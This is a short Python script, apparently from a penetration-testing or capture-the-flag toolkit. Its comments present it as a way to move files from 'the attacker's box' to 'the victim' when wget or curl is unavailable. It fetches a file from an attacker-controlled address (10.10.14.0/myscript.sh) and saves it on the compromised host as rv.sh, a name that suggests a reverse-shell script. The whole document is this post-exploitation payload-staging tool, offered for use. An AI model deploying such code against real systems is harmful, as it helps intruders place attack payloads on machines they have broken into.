# Often you need to transfer files from the attacker's box to the victim.
# But some boxes don't have wget or curl or they are restricted because you are still a low-priv user.
# This script will reach out to the attacker's server and download a file and write it on the victim box if you do have access to python3.

# After changing the url and filename just run using python3 Download.py

from requests import get

def download(url,file_name):
    with open(file_name,"wb") as file:
        response = get(url)
        file.write(response.content)

download("http://10.10.14.0/myscript.sh","rv.sh") #Change the first argument to your IP and the second to any filename you want

